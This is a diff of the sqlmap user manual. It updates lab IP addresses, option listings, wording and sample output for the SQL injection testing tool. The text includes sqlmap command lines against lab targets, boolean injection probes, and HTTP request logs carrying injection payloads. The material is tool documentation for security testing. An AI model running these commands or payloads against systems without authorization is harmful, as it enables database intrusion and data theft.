@@ -74,15 +74,15 @@ or even be able to access the underlying operating system.
 
 Consider that the target url is:
 
-<tscreen><tt>http://192.168.1.121/sqlmap/mysql/get_int.php?id=1</tt></tscreen>
+<tscreen><tt>http://172.16.213.131/sqlmap/mysql/get_int.php?id=1</tt></tscreen>
 
 Assume that:
 
-<tscreen><tt>http://192.168.1.121/sqlmap/mysql/get_int.php?id=1+AND+1=1</tt></tscreen>
+<tscreen><tt>http://172.16.213.131/sqlmap/mysql/get_int.php?id=1+AND+1=1</tt></tscreen>
 
 is the same page as the original one and:
 
-<tscreen><tt>http://192.168.1.121/sqlmap/mysql/get_int.php?id=1+AND+1=2</tt></tscreen>
+<tscreen><tt>http://172.16.213.131/sqlmap/mysql/get_int.php?id=1+AND+1=2</tt></tscreen>
 
 differs from the original one, it means that you are in front of a SQL
 injection vulnerability in the <tt>id</tt> <tt>GET</tt> parameter of the
@@ -131,7 +131,7 @@ exploit SQL injection vulnerabilities in web application and it is
 recommended to read them if you are not familiar with the issue before
 going ahead with sqlmap.
 
-Passing the original address, <tt>http://192.168.1.121/sqlmap/mysql/get_int.php?id=1</tt>
+Passing the original address, <tt>http://172.16.213.131/sqlmap/mysql/get_int.php?id=1</tt>
 to sqlmap, the tool will automatically:
 
 <itemize>
@@ -506,12 +506,12 @@ Options:
     --auth-cred=ACRED   HTTP Authentication credentials (name:password)
     --auth-cert=ACERT   HTTPs Authentication certificate (key_file,cert_file)
     --proxy=PROXY       Use a HTTP proxy to connect to the target url
+    --ignore-proxy      Ignore system default HTTP proxy
     --threads=THREADS   Maximum number of concurrent HTTP requests (default 1)
     --delay=DELAY       Delay in seconds between each HTTP request
     --timeout=TIMEOUT   Seconds to wait before timeout connection (default 30)
     --retries=RETRIES   Retries when the connection timeouts (default 3)
     --scope=SCOPE       Regexp to filter targets from provided proxy log
-    --ignore-proxy      Ignore system default HTTP proxy
 
   Injection:
     These options can be used to specify which parameters to test for,
@@ -631,45 +631,38 @@ Option: <tt>-v</tt>
 <p>
 Verbose options can be used to set the verbosity level of output messages.
 There exist six levels.
-The default level is <bf>1</bf> in which information, warnings, errors and
-tracebacks, if they occur, will be shown.
+The default level is <bf>1</bf> in which
+information, warnings, errors and tracebacks (if any occur) will be shown.
 Level <bf>2</bf> shows also debug messages, level <bf>3</bf> shows also
-HTTP requests with all HTTP headers sent, level <bf>4</bf> shows also HTTP
-responses headers and level <bf>5</bf> shows also HTTP responses page
-content.
+full HTTP requests, level <bf>4</bf> shows also HTTP responses headers and
+level <bf>5</bf> shows also HTTP responses page content.
 
 <p>
 Example on a <bf>MySQL 5.0.67</bf> target (verbosity level <bf>1</bf>):
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1" -v 1
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/mysql/get_int.php?id=1" -v 1
 
-[hh:mm:12] [INFO] testing connection to the target url
-[hh:mm:12] [INFO] testing if the url is stable, wait a few seconds
-[hh:mm:14] [INFO] url is stable
-[hh:mm:14] [INFO] testing if User-Agent parameter 'User-Agent' is dynamic
-[hh:mm:14] [WARNING] User-Agent parameter 'User-Agent' is not dynamic
-[hh:mm:14] [INFO] testing if GET parameter 'id' is dynamic
-[hh:mm:14] [INFO] confirming that GET parameter 'id' is dynamic
-[hh:mm:14] [INFO] GET parameter 'id' is dynamic
-[hh:mm:14] [INFO] testing sql injection on GET parameter 'id' with 0 parenthesis
-[hh:mm:14] [INFO] testing unescaped numeric injection on GET parameter 'id'
-[hh:mm:14] [INFO] confirming unescaped numeric injection on GET parameter 'id'
-[hh:mm:14] [INFO] GET parameter 'id' is unescaped numeric injectable with 0 parenthesis
-[hh:mm:14] [INFO] testing for parenthesis on injectable parameter
-[hh:mm:14] [INFO] the injectable parameter requires 0 parenthesis
-[hh:mm:14] [INFO] testing MySQL
-[hh:mm:14] [INFO] query: CONCAT(CHAR(53), CHAR(53))
-[hh:mm:14] [INFO] retrieved: 55
-[hh:mm:14] [INFO] performed 20 queries in 0 seconds
-[hh:mm:14] [INFO] confirming MySQL
-[hh:mm:14] [INFO] query: LENGTH(CHAR(53))
-[hh:mm:14] [INFO] retrieved: 1
-[hh:mm:14] [INFO] performed 13 queries in 0 seconds
-[hh:mm:14] [INFO] query: SELECT 5 FROM information_schema.TABLES LIMIT 0, 1
-[hh:mm:14] [INFO] retrieved: 5
-[hh:mm:14] [INFO] performed 13 queries in 0 seconds
-web server operating system: Linux Ubuntu 8.10 (Intrepid Ibex)
+[hh:mm:58] [INFO] using '/home/inquis/software/sqlmap/subversion/trunk/sqlmap/output/172.16.213.131/session' as session file
+[hh:mm:58] [INFO] testing connection to the target url
+[hh:mm:58] [INFO] testing if the url is stable, wait a few seconds
+[hh:mm:59] [INFO] url is stable
+[hh:mm:59] [INFO] testing if User-Agent parameter 'User-Agent' is dynamic
+[hh:mm:59] [WARNING] User-Agent parameter 'User-Agent' is not dynamic
+[hh:mm:59] [INFO] testing if GET parameter 'id' is dynamic
+[hh:mm:59] [INFO] confirming that GET parameter 'id' is dynamic
+[hh:mm:59] [INFO] GET parameter 'id' is dynamic
+[hh:mm:59] [INFO] testing sql injection on GET parameter 'id' with 0 parenthesis
+[hh:mm:59] [INFO] testing unescaped numeric injection on GET parameter 'id'
+[hh:mm:59] [INFO] confirming unescaped numeric injection on GET parameter 'id'
+[hh:mm:59] [INFO] GET parameter 'id' is unescaped numeric injectable with 0 parenthesis
+[hh:mm:59] [INFO] testing for parenthesis on injectable parameter
+[hh:mm:59] [INFO] the injectable parameter requires 0 parenthesis
+[hh:mm:59] [INFO] testing MySQL
+[hh:mm:59] [INFO] confirming MySQL
+[hh:mm:59] [INFO] retrieved: 0
+[hh:mm:59] [INFO] the back-end DBMS is MySQL
+
 web application technology: PHP 5.2.6, Apache 2.2.9
 back-end DBMS: MySQL >= 5.0.0
 </verb></tscreen>
@@ -678,58 +671,74 @@ back-end DBMS: MySQL >= 5.0.0
 Example on a <bf>MySQL 5.0.67</bf> target (verbosity level <bf>2</bf>):
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1" -v 2
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/mysql/get_int.php?id=1" -v 2
 
-[hh:mm:03] [DEBUG] initializing the configuration
-[hh:mm:03] [DEBUG] initializing the knowledge base
-[hh:mm:03] [DEBUG] cleaning up configuration parameters
-[hh:mm:03] [DEBUG] setting the HTTP method to GET
-[hh:mm:03] [DEBUG] creating HTTP requests opener object
-[hh:mm:03] [DEBUG] parsing XML queries file
-[hh:mm:03] [INFO] testing connection to the target url
-[hh:mm:03] [INFO] testing if the url is stable, wait a few seconds
-[hh:mm:04] [INFO] url is stable
-[hh:mm:04] [INFO] testing if User-Agent parameter 'User-Agent' is dynamic
-[hh:mm:04] [WARNING] User-Agent parameter 'User-Agent' is not dynamic
-[hh:mm:04] [INFO] testing if GET parameter 'id' is dynamic
-[hh:mm:04] [INFO] confirming that GET parameter 'id' is dynamic
-[hh:mm:04] [INFO] GET parameter 'id' is dynamic
-[hh:mm:04] [INFO] testing sql injection on GET parameter 'id' with 0 parenthesis
-[hh:mm:04] [INFO] testing unescaped numeric injection on GET parameter 'id'
-[hh:mm:04] [INFO] confirming unescaped numeric injection on GET parameter 'id'
-[hh:mm:04] [INFO] GET parameter 'id' is unescaped numeric injectable with 0 parenthesis
-[...]
+[hh:mm:22] [DEBUG] initializing the configuration
+[hh:mm:22] [DEBUG] initializing the knowledge base
+[hh:mm:22] [DEBUG] cleaning up configuration parameters
+[hh:mm:22] [DEBUG] setting the HTTP timeout
+[hh:mm:22] [DEBUG] setting the HTTP method to GET
+[hh:mm:22] [DEBUG] creating HTTP requests opener object
+[hh:mm:22] [DEBUG] parsing XML queries file
+[hh:mm:22] [INFO] using '/home/inquis/software/sqlmap/subversion/trunk/sqlmap/output/172.16.213.131/session' as session file
+[hh:mm:22] [INFO] testing connection to the target url
+[hh:mm:22] [INFO] testing if the url is stable, wait a few seconds
+[hh:mm:23] [INFO] url is stable
+[hh:mm:23] [INFO] testing if User-Agent parameter 'User-Agent' is dynamic
+[hh:mm:23] [WARNING] User-Agent parameter 'User-Agent' is not dynamic
+[hh:mm:23] [INFO] testing if GET parameter 'id' is dynamic
+[hh:mm:23] [DEBUG] setting match ratio to 0.743
+[hh:mm:23] [INFO] confirming that GET parameter 'id' is dynamic
+[hh:mm:23] [INFO] GET parameter 'id' is dynamic
+[hh:mm:23] [INFO] testing sql injection on GET parameter 'id' with 0 parenthesis
+[hh:mm:23] [INFO] testing unescaped numeric injection on GET parameter 'id'
+[hh:mm:23] [INFO] confirming unescaped numeric injection on GET parameter 'id'
+[hh:mm:23] [INFO] GET parameter 'id' is unescaped numeric injectable with 0 parenthesis
+[hh:mm:23] [INFO] testing for parenthesis on injectable parameter
+[hh:mm:23] [INFO] the injectable parameter requires 0 parenthesis
+[hh:mm:23] [INFO] testing MySQL
+[hh:mm:23] [INFO] confirming MySQL
+[hh:mm:23] [DEBUG] query: SELECT 2 FROM information_schema.TABLES LIMIT 0, 1
+[hh:mm:23] [INFO] retrieved: 2
+[hh:mm:23] [DEBUG] performed 7 queries in 0 seconds
+[hh:mm:23] [INFO] the back-end DBMS is MySQL
+
+web application technology: PHP 5.2.6, Apache 2.2.9
+back-end DBMS: MySQL >= 5.0.0
 </verb></tscreen>
 
 <p>
 Example on a <bf>MySQL 5.0.67</bf> target (verbosity level <bf>3</bf>):
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1" -v 3
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/mysql/get_int.php?id=1" -v 3
 
-[...]
-[hh:mm:54] [INFO] testing connection to the target url
-[hh:mm:54] [TRAFFIC OUT] HTTP request:
+[hh:mm:53] [DEBUG] initializing the configuration
+[hh:mm:53] [DEBUG] initializing the knowledge base
+[hh:mm:53] [DEBUG] cleaning up configuration parameters
+[hh:mm:53] [DEBUG] setting the HTTP timeout
+[hh:mm:53] [DEBUG] setting the HTTP method to GET
+[hh:mm:53] [DEBUG] creating HTTP requests opener object
+[hh:mm:53] [DEBUG] parsing XML queries file
+[hh:mm:53] [INFO] using '/home/inquis/software/sqlmap/subversion/trunk/sqlmap/output/172.16.213.131/session' as session file
+[hh:mm:53] [INFO] testing connection to the target url
+[hh:mm:53] [TRAFFIC OUT] HTTP request:
 GET /sqlmap/mysql/get_int.php?id=1 HTTP/1.1
 Accept-charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7
-Host: 192.168.1.121:80
+Host: 172.16.213.131
 Accept-language: en-us,en;q=0.5
-Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,
-image/png,*/*;q=0.5
-User-agent: sqlmap/0.8 (http://sqlmap.sourceforge.net)
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+User-agent: sqlmap/0.8-rc7 (http://sqlmap.sourceforge.net)
 Connection: close
 [...]
-[hh:mm:55] [INFO] testing MySQL
-[hh:mm:55] [INFO] query: CONCAT(CHAR(54), CHAR(54))
-[hh:mm:55] [TRAFFIC OUT] HTTP request:
-GET /sqlmap/mysql/get_int.php?id=1%20AND%20ORD%28MID%28%28CONCAT%28CHAR%2854%29%2C%20CHAR
-%2854%29%29%29%2C%201%2C%201%29%29%20%3E%2063%20AND%201104=1104 HTTP/1.1
+[hh:mm:54] [INFO] testing MySQL
+[hh:mm:54] [TRAFFIC OUT] HTTP request:
+GET /sqlmap/mysql/get_int.php?id=1%20AND%20CONNECTION_ID%28%29=CONNECTION_ID%28%29%20AND%202385=2385 HTTP/1.1
 Accept-charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7
-Host: 192.168.1.121:80
+Host: 172.16.213.131
 Accept-language: en-us,en;q=0.5
-Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,
-image/png,*/*;q=0.5
-User-agent: sqlmap/0.8 (http://sqlmap.sourceforge.net)
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+User-agent: sqlmap/0.8-rc7 (http://sqlmap.sourceforge.net)
 Connection: close
 [...]
 </verb></tscreen>
@@ -738,40 +747,35 @@ Connection: close
 Example on a <bf>MySQL 5.0.67</bf> target (verbosity level <bf>4</bf>):
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1" -v 4
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/mysql/get_int.php?id=1" -v 4
 
 [...]
-[hh:mm:44] [INFO] testing connection to the target url
-[hh:mm:44] [TRAFFIC OUT] HTTP request:
+[hh:mm:20] [DEBUG] initializing the configuration
+[hh:mm:20] [DEBUG] initializing the knowledge base
+[hh:mm:20] [DEBUG] cleaning up configuration parameters
+[hh:mm:20] [DEBUG] setting the HTTP timeout
+[hh:mm:20] [DEBUG] setting the HTTP method to GET
+[hh:mm:20] [DEBUG] creating HTTP requests opener object
+[hh:mm:20] [DEBUG] parsing XML queries file
+[hh:mm:20] [INFO] using '/home/inquis/software/sqlmap/subversion/trunk/sqlmap/output/172.16.213.131/session' as session file
+[hh:mm:20] [INFO] testing connection to the target url
+[hh:mm:20] [TRAFFIC OUT] HTTP request:
 GET /sqlmap/mysql/get_int.php?id=1 HTTP/1.1
 Accept-charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7
-Host: 192.168.1.121:80
+Host: 172.16.213.131
 Accept-language: en-us,en;q=0.5
-Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,
-image/png,*/*;q=0.5
-User-agent: sqlmap/0.8 (http://sqlmap.sourceforge.net)
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+User-agent: sqlmap/0.8-rc7 (http://sqlmap.sourceforge.net)
 Connection: close
 
-[hh:mm:44] [TRAFFIC IN] HTTP response (OK - 200):
-Date: Thu, 11 Dec 2008 hh:mm:44 GMT
-Server: Apache/2.2.9 (Ubuntu) PHP/5.2.6-2ubuntu4 with Suhosin-Patch
-X-Powered-By: PHP/5.2.6-2ubuntu4
-Content-Length: 119
+[hh:mm:20] [TRAFFIC IN] HTTP response (OK - 200):
+Date: Sat, 20 Feb 2010 17:43:00 GMT
+Server: Apache/2.2.9
+X-Powered-By: PHP/5.2.6-1+lenny4
+Vary: Accept-Encoding
+Content-Length: 127
 Connection: close
 Content-Type: text/html
-[...]
-[hh:mm:45] [INFO] testing MySQL
-[hh:mm:46] [INFO] query: CONCAT(CHAR(52), CHAR(52))
-[hh:mm:46] [TRAFFIC OUT] HTTP request:
-GET /sqlmap/mysql/get_int.php?id=1%20AND%20ORD%28MID%28%28CONCAT%28CHAR%2852%29%2C%20CHAR
-%2852%29%29%29%2C%201%2C%201%29%29%20%3E%2063%20AND%203030=3030 HTTP/1.1
-Accept-charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7
-Host: 192.168.1.121:80
-Accept-language: en-us,en;q=0.5
-Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,
-image/png,*/*;q=0.5
-User-agent: sqlmap/0.8 (http://sqlmap.sourceforge.net)
-Connection: close
 [...]
 </verb></tscreen>
 
@@ -779,59 +783,39 @@ Connection: close
 Example on a <bf>MySQL 5.0.67</bf> target (verbosity level <bf>5</bf>):
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1" -v 5
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/mysql/get_int.php?id=1" -v 5
 
-[...]
-[hh:mm:17] [INFO] testing connection to the target url
-[hh:mm:17] [TRAFFIC OUT] HTTP request:
+[hh:mm:47] [DEBUG] initializing the configuration
+[hh:mm:47] [DEBUG] initializing the knowledge base
+[hh:mm:47] [DEBUG] cleaning up configuration parameters
+[hh:mm:47] [DEBUG] setting the HTTP timeout
+[hh:mm:47] [DEBUG] setting the HTTP method to GET
+[hh:mm:47] [DEBUG] creating HTTP requests opener object
+[hh:mm:47] [DEBUG] parsing XML queries file
+[hh:mm:47] [INFO] using '/home/inquis/software/sqlmap/subversion/trunk/sqlmap/output/172.16.213.131/session' as session file
+[hh:mm:47] [INFO] testing connection to the target url
+[hh:mm:47] [TRAFFIC OUT] HTTP request:
 GET /sqlmap/mysql/get_int.php?id=1 HTTP/1.1
 Accept-charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7
-Host: 192.168.1.121:80
+Host: 172.16.213.131
 Accept-language: en-us,en;q=0.5
-Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,
-image/png,*/*;q=0.5
-User-agent: sqlmap/0.8 (http://sqlmap.sourceforge.net)
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+User-agent: sqlmap/0.8-rc7 (http://sqlmap.sourceforge.net)
 Connection: close
 
-[hh:mm:17] [TRAFFIC IN] HTTP response (OK - 200):
-Date: Thu, 11 Dec 2008 hh:mm:17 GMT
-Server: Apache/2.2.9 (Ubuntu) PHP/5.2.6-2ubuntu4 with Suhosin-Patch
-X-Powered-By: PHP/5.2.6-2ubuntu4
-Content-Length: 119
+[hh:mm:47] [TRAFFIC IN] HTTP response (OK - 200):
+Date: Sat, 20 Feb 2010 17:44:27 GMT
+Server: Apache/2.2.9
+X-Powered-By: PHP/5.2.6-1+lenny4
+Vary: Accept-Encoding
 Connection: close
+Transfer-Encoding: chunked
 Content-Type: text/html
 
 &lt;html&gt;&lt;body&gt;
 &lt;b&gt;SQL results:&lt;/b&gt;
 &lt;table border="1"&gt;
 &lt;tr&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;luther&lt;/td&gt;&lt;td&gt;blissett&lt;/td&gt;&lt;/tr&gt;
-&lt;/table&gt;
-&lt;/body&gt;&lt;/html&gt;
-[...]
-[hh:mm:18] [INFO] testing MySQL
-[hh:mm:18] [INFO] query: CONCAT(CHAR(51), CHAR(51))
-[hh:mm:18] [TRAFFIC OUT] HTTP request:
-GET /sqlmap/mysql/get_int.php?id=1%20AND%20ORD%28MID%28%28CONCAT%28CHAR%2851%29%2C%20CHAR
-%2851%29%29%29%2C%201%2C%201%29%29%20%3E%2063%20AND%202581=2581 HTTP/1.1
-Accept-charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7
-Host: 192.168.1.121:80
-Accept-language: en-us,en;q=0.5
-Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,
-image/png,*/*;q=0.5
-User-agent: sqlmap/0.8 (http://sqlmap.sourceforge.net)
-Connection: close
-
-[hh:mm:18] [TRAFFIC IN] HTTP response (OK - 200):
-Date: Thu, 11 Dec 2008 hh:mm:18 GMT
-Server: Apache/2.2.9 (Ubuntu) PHP/5.2.6-2ubuntu4 with Suhosin-Patch
-X-Powered-By: PHP/5.2.6-2ubuntu4
-Content-Length: 75
-Connection: close
-Content-Type: text/html
-
-&lt;html&gt;&lt;body&gt;
-&lt;b&gt;SQL results:&lt;/b&gt;
-&lt;table border="1"&gt;
 &lt;/table&gt;
 &lt;/body&gt;&lt;/html&gt;
 [...]
@@ -842,7 +826,7 @@ Content-Type: text/html
 
 <p>
 At least one of these options has to be specified to set the source to get
-target urls from.
+target addresses from.
 
 <sect2>Target URL
 
@@ -850,29 +834,28 @@ target urls from.
 Option: <tt>-u</tt> or <tt>-</tt><tt>-url</tt>
 
 <p>
-To run sqlmap on a single target URL.
+To run sqlmap against a single target URL.
 
 <p>
 Example on a <bf>MySQL 5.0.67</bf> target:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1"
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/mysql/get_int.php?id=1"
 
 [...]
-web server operating system: Linux Ubuntu 8.10 (Intrepid Ibex)
 web application technology: PHP 5.2.6, Apache 2.2.9
-back-end DBMS: MySQL >= 5.0.0
+back-end DBMS: MySQL 5
 </verb></tscreen>
 
 
-<sect2>Parse targets from Burp or WebScarab logs
+<sect2>Parse targets from Burp or WebScarab proxy logs
 
 <p>
 Option: <tt>-l</tt>
 
 <p>
-Rather than providing a single target URL it is possible to test and inject
-on HTTP requests proxied through <htmlurl url="http://portswigger.net/suite/" name="Burp proxy">
+Rather than providing a single target URL, it is possible to test and
+inject on HTTP requests proxied through <htmlurl url="http://portswigger.net/suite/" name="Burp proxy">
 or <htmlurl url="http://www.owasp.org/index.php/Category:OWASP_WebScarab_Project" name="WebScarab proxy">.
 
 <p>
@@ -884,7 +867,7 @@ $ python sqlmap.py -l /tmp/webscarab.log/conversations/
 [hh:mm:43] [INFO] sqlmap parsed 27 testable requests from the targets list
 [hh:mm:43] [INFO] sqlmap got a total of 27 targets
 [hh:mm:43] [INPUT] url 1:
-GET http://192.168.1.121:80/phpmyadmin/navigation.php?db=test&amp;token=60747016432606019619a
+GET http://172.16.213.131/phpmyadmin/navigation.php?db=test&amp;token=60747016432606019619a
 c58b3780562
 Cookie: PPA_ID=197bf44d671aeb7d3a28719a467d86c3; phpMyAdmin=366c9c9b329a98eabb4b708c2df8b
 d7d392eb151; pmaCookieVer=4; pmaPass-1=uH9%2Fz5%2FsB%2FM%3D; pmaUser-1=pInZx5iWPrA%3D; 
@@ -892,10 +875,10 @@ pma_charset=iso-8859-1; pma_collation_connection=utf8_unicode_ci; pma_fontsize=d
 pma_lang=en-utf-8; pma_mcrypt_iv=o6Mwtqw6c0c%3D; pma_theme=deleted
 do you want to test this url? [Y/n/q] n
 [hh:mm:46] [INPUT] url 2:
-GET http://192.168.1.121:80/sqlmap/mysql/get_int.php?id=1
+GET http://172.16.213.131/sqlmap/mysql/get_int.php?id=1
 Cookie: PPA_ID=197bf44d671aeb7d3a28719a467d86c3
 do you want to test this url? [Y/n/q] y
-[hh:mm:49] [INFO] testing url http://192.168.1.121:80/sqlmap/mysql/get_int.php?id=1
+[hh:mm:49] [INFO] testing url http://172.16.213.131/sqlmap/mysql/get_int.php?id=1
 [hh:mm:49] [INFO] testing connection to the target url
 [hh:mm:49] [INFO] testing if the url is stable, wait a few seconds
 [hh:mm:50] [INFO] url is stable
@@ -937,7 +920,7 @@ back-end DBMS: MySQL >= 5.0.0
 Option: <tt>-r</tt>
 
 <p>
-One of the possibilities of sqlmap is loading of complete HTTP 
+One of the possibilities of sqlmap is loading of complete HTTP
 request packet stored in textual file. That way you can skip usage of
 bunch of other options.
 
@@ -946,7 +929,7 @@ Sample content of a HTTP request file:
 
 <tscreen><verb>
 POST /sqlmap/mysql/post_int.php HTTP/1.1
-Host: 157.247.180.194
+Host: 172.16.213.131
 User-Agent: Mozilla/4.0
 
 id=1
@@ -956,34 +939,33 @@ id=1
 Example usage:
 
 <tscreen><verb>
-
 $ python sqlmap.py -r request.txt
 
 [...]
-[11:54:27] [INFO] parsing HTTP request from 'request.txt'
+[hh:mm:27] [INFO] parsing HTTP request from 'request.txt'
 [...]
-[11:52:21] [INFO] testing if POST parameter 'id' is dynamic
-[11:52:22] [INFO] confirming that POST parameter 'id' is dynamic
-[11:52:22] [INFO] POST parameter 'id' is dynamic
-[11:52:22] [INFO] testing sql injection on POST parameter 'id' with 0 parenthesis
-[11:52:22] [INFO] testing unescaped numeric injection on POST parameter 'id'
-[11:52:22] [INFO] confirming unescaped numeric injection on POST parameter 'id'
-[11:52:22] [INFO] POST parameter 'id' is unescaped numeric injectable with 0 parenthesis
-[11:52:22] [INFO] testing if User-Agent parameter 'User-Agent' is dynamic
-[11:52:22] [WARNING] User-Agent parameter 'User-Agent' is not dynamic
-[11:52:22] [INFO] testing for parenthesis on injectable parameter
-[11:52:22] [INFO] the injectable parameter requires 0 parenthesis
-[11:52:22] [INFO] testing MySQL
-[11:52:22] [INFO] confirming MySQL
-[11:52:22] [INFO] retrieved: 3
-[11:52:22] [INFO] the back-end DBMS is MySQL
+[hh:mm:21] [INFO] testing if POST parameter 'id' is dynamic
+[hh:mm:22] [INFO] confirming that POST parameter 'id' is dynamic
+[hh:mm:22] [INFO] POST parameter 'id' is dynamic
+[hh:mm:22] [INFO] testing sql injection on POST parameter 'id' with 0 parenthesis
+[hh:mm:22] [INFO] testing unescaped numeric injection on POST parameter 'id'
+[hh:mm:22] [INFO] confirming unescaped numeric injection on POST parameter 'id'
+[hh:mm:22] [INFO] POST parameter 'id' is unescaped numeric injectable with 0 parenthesis
+[hh:mm:22] [INFO] testing if User-Agent parameter 'User-Agent' is dynamic
+[hh:mm:22] [WARNING] User-Agent parameter 'User-Agent' is not dynamic
+[hh:mm:22] [INFO] testing for parenthesis on injectable parameter
+[hh:mm:22] [INFO] the injectable parameter requires 0 parenthesis
+[hh:mm:22] [INFO] testing MySQL
+[hh:mm:22] [INFO] confirming MySQL
+[hh:mm:22] [INFO] retrieved: 3
+[hh:mm:22] [INFO] the back-end DBMS is MySQL
 web server operating system: Linux Ubuntu 8.04 (Hardy Heron)
 web application technology: PHP 5.2.4, Apache 2.2.8
 back-end DBMS: MySQL >= 5.0.0
 </verb></tscreen>
 
 
-<sect2>Process Google dork results as target urls
+<sect2>Process Google dork results as target addresses
 
 <p>
 Option: <tt>-g</tt>
@@ -1042,7 +1024,7 @@ It is possible to pass user's options from a configuration INI file, an
 example is <tt>sqlmap.conf</tt>.
 
 <p>
-Example on a <bf>MySQL 5.0.67</bf> target:
+Example usage:
 
 <tscreen><verb>
 $ python sqlmap.py -c "sqlmap.conf"
@@ -1061,7 +1043,8 @@ the provided configuration file.
 <sect1>Request
 
 <p>
-These options can be used to specify how to connect to the target url.
+These options can be used to specify how to connect to the target
+application.
 
 <sect2>HTTP method: <tt>GET</tt> or <tt>POST</tt>
 
@@ -1078,7 +1061,7 @@ tested for SQL injection like the <tt>GET</tt> parameters.
 Example on an <bf>Oracle XE 10.2.0.1</bf> target:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/oracle/post_int.php" --method POST \
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/oracle/post_int.php" --method POST \
   --data "id=1"
 
 [hh:mm:53] [INFO] testing connection to the target url
@@ -1109,7 +1092,7 @@ back-end DBMS:    Oracle
 <sect2>HTTP <tt>Cookie</tt> header
 
 <p>
-Option: <tt>-</tt><tt>-cookie</tt>
+Options: <tt>-</tt><tt>-cookie</tt>, <tt>-</tt><tt>-drop-set-cookie</tt> and <tt>-</tt><tt>-cookie-urlencode</tt>
 
 <p>
 This feature can be useful in two scenarios:
@@ -1139,7 +1122,7 @@ value to the clipboard.
 Example on a <bf>Microsoft SQL Server 2000 Service Pack 0</bf> target:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mssql/cookie_int.php" --cookie \
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/mssql/cookie_int.php" --cookie \
   "id=1" -v 1
 
 [hh:mm:37] [INFO] testing connection to the target url
@@ -1156,27 +1139,28 @@ $ python sqlmap.py -u "http://192.168.1.121/sqlmap/mssql/cookie_int.php" --cooki
 </verb></tscreen>
 
 <p>
-Note that the HTTP <tt>Cookie</tt> header values are separated by a
-<tt>;</tt> character, <bf>not</bf> by an <tt>&amp;</tt>.
+Note that the HTTP <tt>Cookie</tt> header values are usually separated by
+a <tt>;</tt> character, <bf>not</bf> by an <tt>&amp;</tt>.
 
 <p>
-If the web application at first HTTP response has within the HTTP headers
-a <tt>Set-Cookie</tt> header, sqlmap will automatically use it in all HTTP
-requests as the HTTP <tt>Cookie</tt> header and also test for SQL
-injection on these values.
+If the web application at first HTTP response has a <tt>Set-Cookie</tt>
+header, sqlmap will automatically use it's value in all further HTTP
+requests as the <tt>Cookie</tt> header. sqlmap will also automatically
+test that value for SQL injection, except if you run it with
+<tt>--drop-set-cookie</tt> option.
 
 <p>
 Example on a <bf>Microsoft SQL Server 2000 Service Pack 0</bf> target:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.125/sqlmap/get_str.asp?name=luther" -v 3
+$ python sqlmap.py -u "http://172.16.213.128/sqlmap/get_str.asp?name=luther" -v 3
 
 [...]
 [hh:mm:39] [INFO] testing connection to the target url
 [hh:mm:39] [TRAFFIC OUT] HTTP request:
 GET /sqlmap/get_str.asp?name=luther HTTP/1.1
 Accept-charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7
-Host: 192.168.1.125:80
+Host: 172.16.213.128:80
 Accept-language: en-us,en;q=0.5
 Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,
 image/png,*/*;q=0.5
@@ -1191,7 +1175,7 @@ Connection: close
 [hh:mm:40] [TRAFFIC OUT] HTTP request:
 GET /sqlmap/get_str.asp?name=luther HTTP/1.1
 Accept-charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7
-Host: 192.168.1.125:80
+Host: 172.16.213.128:80
 Accept-language: en-us,en;q=0.5
 Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,
 image/png,*/*;q=0.5
@@ -1212,32 +1196,17 @@ in the following HTTP requests.
 Example on a <bf>Microsoft SQL Server 2000 Service Pack 0</bf> target:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.125/sqlmap/get_str.asp?name=luther" --cookie "id=1"
+$ python sqlmap.py -u "http://172.16.213.128/sqlmap/get_str.asp?name=luther" --cookie "id=1"
 
 [hh:mm:51] [INPUT] you provided an HTTP Cookie header value. The target url provided its
